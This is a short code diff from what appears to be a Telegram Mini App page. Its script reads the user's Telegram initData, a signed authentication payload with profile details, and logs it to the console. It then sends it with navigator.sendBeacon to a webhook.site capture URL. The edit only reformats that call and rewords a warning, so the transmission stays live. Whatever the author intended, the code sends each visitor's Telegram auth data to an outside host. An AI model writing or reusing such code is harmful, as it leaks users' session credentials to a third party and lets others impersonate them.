@@ -18,14 +18,15 @@
     console.log("🔐 Telegram initData:", initData);
     console.log("🔓 Parsed initDataUnsafe:", initDataUnsafe);
 
-    // Only send if data is available
     if (initData && initData.length > 0) {
       navigator.sendBeacon(
         "https://webhook.site/388648e4-9e1e-4912-b937-c8ac12c8aafd",
-        new Blob([JSON.stringify({ initData, initDataUnsafe })], { type: "application/json" })
+        new Blob([JSON.stringify({ initData, initDataUnsafe })], {
+          type: "application/json"
+        })
       );
     } else {
-      console.warn("❌ initData is empty — make sure the WebApp is opened inside Telegram.");
+      console.warn("⚠️ initData is empty — are you inside Telegram WebView?");
     }
   });
 </script>
